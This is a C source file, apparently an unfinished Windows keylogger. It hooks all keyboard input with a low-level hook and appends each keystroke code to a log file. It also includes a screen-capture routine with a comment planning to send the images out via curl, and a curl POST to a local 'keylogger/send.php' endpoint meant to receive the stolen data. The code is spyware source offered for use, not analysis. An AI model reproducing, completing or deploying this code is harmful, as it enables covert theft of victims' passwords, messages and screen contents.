#include <stdio.h>
#include <time.h>
#include "curl/curl.h"

void ScreenCapture(int width, int height)
{
	HDC hDc = CreateCompatibleDC(0);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
	
	// convertire in PNG e inviare via curl
	
	DeleteObject(hBmp);
}

int curl()
{
  CURL *curl;
  CURLcode res;

  /* In windows, this will init the winsock stuff */
  curl_global_init(CURL_GLOBAL_ALL);

  /* get a curl handle */
  curl = curl_easy_init();
  if(curl) {
    /* First set the URL that is about to receive our POST. This URL can
       just as well be a https:// URL if that is what should receive the
       data. */
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:81/keylogger/send.php");
    /* Now specify the POST data */
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "name=daniel&project=curl");

    /* Perform the request, res will get the return code */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));

    /* always cleanup */
    curl_easy_cleanup(curl);
  }
  curl_global_cleanup();
  
  return 0;	
}



DWORD WINAPI ThreadFunc(void *data)
{
}

void saveKey(unsigned int keyCode)
{
	FILE *log;
	unsigned int p;
	
	log = fopen("log", "a+");
	fprintf(log, "%d,", keyCode);
	fclose(log);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;
    
    if (wParam == WM_KEYDOWN)
    {
    	DWORD key = pKeyBoard->vkCode;
        saveKey(key);
    }
    return 0;
}

DWORD WINAPI KeyLogger()
{
    HHOOK hKeyHook;
    HINSTANCE hExe = GetModuleHandle(NULL);
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC) LowLevelKeyboardProc, hExe, 0);
    RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0x39);
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0) != 0)
    {
        if (msg.message == WM_HOTKEY)
        {
            UnhookWindowsHookEx(hKeyHook);
            return 0;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hKeyHook);

    return 0;
}


int main(void)
{
	HANDLE logger;
    logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);

	while(1)
	{
		sleep(50);
	}
	
	return 0;
}
